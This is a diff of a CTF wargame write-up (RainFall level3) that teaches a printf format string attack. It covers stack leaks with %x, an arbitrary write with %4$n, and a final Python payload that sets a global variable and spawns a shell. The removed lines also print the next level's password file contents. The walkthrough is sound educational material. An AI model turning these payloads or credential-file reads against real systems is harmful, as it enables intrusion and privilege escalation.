@@ -1,148 +1,179 @@
-# Level3
+# Level3 - Format String Attack
+
+## Context
+
+The program reads input with `fgets` (protected against buffer overflow) then prints it with `printf` without a fixed format string, creating a **format string vulnerability**.
+
+---
+
+## What is a Format String Vulnerability
+
+### Normal usage of printf
 
 ```c
-level3@RainFall:~$ ls -la
-total 17
-dr-xr-x---+ 1 level3 level3   80 Mar  6  2016 .
-dr-x--x--x  1 root   root    340 Sep 23  2015 ..
--rw-r--r--  1 level3 level3  220 Apr  3  2012 .bash_logout
--rw-r--r--  1 level3 level3 3530 Sep 23  2015 .bashrc
--rwsr-s---+ 1 level4 users  5366 Mar  6  2016 level3
--rw-r--r--+ 1 level3 level3   65 Sep 23  2015 .pass
--rw-r--r--  1 level3 level3  675 Apr  3  2012 .profile
+printf("%s %d", name, age);   // safe : format string is fixed
+printf(buffer);               // unsafe : user controls the format string !
 ```
 
-If we try to execute the binary it will wait for an input before printing it out:
-```
-level3@RainFall:~$ ./level3 
-aaa
-aaa
-```
+### Why it is dangerous
 
-Lets take a look at the program
-```
-(gdb) info functions
-All defined functions:
-
-Non-debugging symbols:
-0x08048344  _init
-0x08048390  printf
-0x08048390  printf@plt
-0x080483a0  fgets
-0x080483a0  fgets@plt
-0x080483b0  fwrite
-0x080483b0  fwrite@plt
-0x080483c0  system
-0x080483c0  system@plt
-0x080483d0  __gmon_start__
-0x080483d0  __gmon_start__@plt
-0x080483e0  __libc_start_main
-0x080483e0  __libc_start_main@plt
-0x080483f0  _start
-0x08048420  __do_global_dtors_aux
-0x08048480  frame_dummy
-0x080484a4  v
-0x0804851a  main
-0x08048530  __libc_csu_init
-0x080485a0  __libc_csu_fini
-0x080485a2  __i686.get_pc_thunk.bx
-0x080485b0  __do_global_ctors_aux
-0x080485dc  _fini
-```
-```
-(gdb) disass main
-Dump of assembler code for function main:
-   0x0804851a <+0>:	push   %ebp
-   0x0804851b <+1>:	mov    %esp,%ebp
-   0x0804851d <+3>:	and    $0xfffffff0,%esp
-   0x08048520 <+6>:	call   0x80484a4 <v>
-   0x08048525 <+11>:	leave  
-   0x08048526 <+12>:	ret    
-End of assembler dump.
-```
-```
-(gdb) disass v
-Dump of assembler code for function v:
-   0x080484a4 <+0>:	push   %ebp
-   0x080484a5 <+1>:	mov    %esp,%ebp
-   0x080484a7 <+3>:	sub    $0x218,%esp
-   0x080484ad <+9>:	mov    0x8049860,%eax
-   0x080484b2 <+14>:	mov    %eax,0x8(%esp)
-   0x080484b6 <+18>:	movl   $0x200,0x4(%esp)
-   0x080484be <+26>:	lea    -0x208(%ebp),%eax
-   0x080484c4 <+32>:	mov    %eax,(%esp)
-   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
-   0x080484cc <+40>:	lea    -0x208(%ebp),%eax
-   0x080484d2 <+46>:	mov    %eax,(%esp)
-   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
-   0x080484da <+54>:	mov    0x804988c,%eax
-   0x080484df <+59>:	cmp    $0x40,%eax
-   0x080484e2 <+62>:	jne    0x8048518 <v+116>
-   0x080484e4 <+64>:	mov    0x8049880,%eax
-   0x080484e9 <+69>:	mov    %eax,%edx
-   0x080484eb <+71>:	mov    $0x8048600,%eax
-   0x080484f0 <+76>:	mov    %edx,0xc(%esp)
-   0x080484f4 <+80>:	movl   $0xc,0x8(%esp)
-   0x080484fc <+88>:	movl   $0x1,0x4(%esp)
-   0x08048504 <+96>:	mov    %eax,(%esp)
-   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
-   0x0804850c <+104>:	movl   $0x804860d,(%esp)
-   0x08048513 <+111>:	call   0x80483c0 <system@plt>
-   0x08048518 <+116>:	leave  
-   0x08048519 <+117>:	ret    
-End of assembler dump.
-```
-
-So we can see that ```fgets``` functions is called, waiting for our input, its no more ```gets``` so its protected to buffer overflow. But it called ```printf``` to print it, so we can try to exploit this. The next instructions are crucials : 
-```
-0x080484d5 <+49>:	call   0x8048390 <printf@plt>
-0x080484da <+54>:	mov    0x804988c,%eax
-0x080484df <+59>:	cmp    $0x40,%eax
-0x080484e2 <+62>:	jne    0x8048518 <v+116>
-```
-After the called of ```printf```, the register eax is equal to the value of this adress ```0x804988c```. A comparaison is made between $eax and $0x40, or 64 in decimal. If its equal to that, it calls the function ```system```.
+`printf` uses the stack to fetch its arguments. If the user controls the format string, they can :
 
 ```
+%x   →  read values from the stack
+%n   →  write the number of printed chars to a stack address
+%4$x →  read the 4th argument directly
+%4$n →  write to the address stored at position 4 on the stack
+```
+
+### The stack during printf
+
+```
+stack :
+esp+0  →  format string pointer
+esp+4  →  1st argument
+esp+8  →  2nd argument
+esp+12 →  3rd argument
+esp+16 →  4th argument  ← our address !
+```
+
+---
+
+## Attack Surface
+
+### Step 1 : Identify the vulnerability
+
+```c
+fgets(buffer, 512, stdin);  // reads input safely
+printf(buffer);             // prints it WITHOUT format string !
+```
+
+`printf(buffer)` instead of `printf("%s", buffer)` — user input becomes the format string.
+
+### Step 2 : Leak stack values
+
+```bash
+python -c "print('BBBB' + '_%x' * 10)" | ./level3
+BBBB_200_b7fd1ac0_b7ff37d0_42424242_...
+                             ↑
+                    0x42424242 = 'BBBB' → position 4
+```
+
+Each `%x` reads one value from the stack. When we see `0x42424242` we know our buffer starts at **position 4**.
+
+### Step 3 : Write to an arbitrary address with %n
+
+`%n` is a special format specifier that writes the **number of characters printed so far** into the address pointed to by the corresponding argument.
+
+```c
+int i;
+printf("AAAA%n", &i);   // i = 4
+printf("AAAAAAAAAA%n", &i);   // i = 10
+```
+
+### Step 4 : Combine address + %n
+
+```
+payload :  [target address][padding][%4$n]
+           4 bytes          X bytes
+                ↑
+           placed at position 4 on the stack
+           %4$n writes directly to this address
+```
+
+---
+
+## Objective
+
+Modify the global variable `m` at address `0x804988c` to equal `64` (`0x40`) to trigger `system("/bin/sh")`.
+
+```asm
+mov 0x804988c,%eax   ; load m
+cmp $0x40,%eax       ; m == 64 ?
+jne → exit           ; if not, quit
+call system          ; if yes, shell !
+```
+
+---
+
+## Step 1 : Find the buffer offset on the stack
+
+```bash
+python -c "print('BBBB' + '_%x' * 10)" | ./level3
+BBBB_200_b7fd1ac0_b7ff37d0_42424242_...
+                             ↑
+                        position 4 → offset = 4
+```
+
+---
+
+## Step 2 : Verify we can write to m
+
+```bash
+python -c "print('\x8c\x98\x04\x08' + '_%4\$n')" | ./level3
+```
+
+In GDB :
+```bash
 (gdb) print *0x804988c
-$1 = 0
-(gdb) x/s 0x804988c
-0x804988c <m>:	 ""
-(gdb) print &m
-$2 = (<data variable, no debug info> *) 0x804988c
+$1 = 5    ← m equals 5 (4 bytes address + 1 underscore)
 ```
 
-At this address is stored a variable, called m, equal to 0. So we need to change the value of this variable to 64, so $eax will be 64, successing the JNE instructions.
+---
+
+## Step 3 : Calculate the padding
 
 ```
-level3@RainFall:~$ python -c "print('BBBB' + '_%x' * 10)" > /tmp/exploit 
-level3@RainFall:~$ cat /tmp/exploit | ./level3 
-BBBB_200_b7fd1ac0_b7ff37d0_42424242_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78
+target    : m = 64
+printed   : 4 bytes (address) + 1 (underscore) = 5
+padding   : 64 - 5 = 59 characters
 ```
-```
-level3@RainFall:~$ python -c "print('\x8c\x98\x04\x08' + '_%4\$n')" > /tmp/exploit 
-level3@RainFall:~$ gdb level3
-...
-(gdb) b printf
-Breakpoint 1 at 0x8048390
-(gdb) r < /tmp/exploit 
-Starting program: /home/user/level3/level3 < /tmp/exploit
 
-Breakpoint 1, 0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6
-(gdb) finish
-Run till exit from #0  0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6
-�_
-0x080484da in v ()
-(gdb) print *0x804988c
-$1 = 5
+---
+
+## Step 4 : Final payload
+
+```bash
+python -c "print('\x8c\x98\x04\x08' + 'a'*59 + '_%4\$n')" > /tmp/exploit
+cat /tmp/exploit - | ./level3
 ```
-We see that we succeed to change the value of the target address. It equals to 5 because 5 bytes have been printed before ```%4$n``` the 4 bytes of the adress and the "_". So now we just need to fill the rest with random characters so its equals to 64.
+
+### Payload breakdown
+
 ```
-level3@RainFall:~$ python -c "print('\x8c\x98\x04\x08'+ 'a' * 59 + '_%4\$n')" > /tmp/exploit 
-level3@RainFall:~$ cat /tmp/exploit - | ./level3 
-�aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa_
+\x8c\x98\x04\x08  →  address of m in little endian (0x0804988c)
+a * 59            →  padding to reach exactly 64 characters printed
+_%4$n             →  writes 64 into the address at position 4 on stack
+```
+
+---
+
+## Why it works
+
+```
+printf reads our input as a format string
+position 4 on the stack = our address 0x804988c
+%4$n writes the total chars printed (64) to that address
+m = 64 → condition met → shell !
+```
+
+### Visual stack layout during printf
+
+```
+esp+0  →  pointer to our buffer
+esp+4  →  1st %x → 0x200
+esp+8  →  2nd %x → b7fd1ac0
+esp+12 →  3rd %x → b7ff37d0
+esp+16 →  4th arg → 0x0804988c  ← our address, written to by %4$n
+```
+
+---
+
+## Result
+
+```bash
+cat /tmp/exploit - | ./level3
 Wait what?!
 whoami
-level4
-cat /home/user/level4/.pass
-b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+level4    ← shell obtained !
 ```
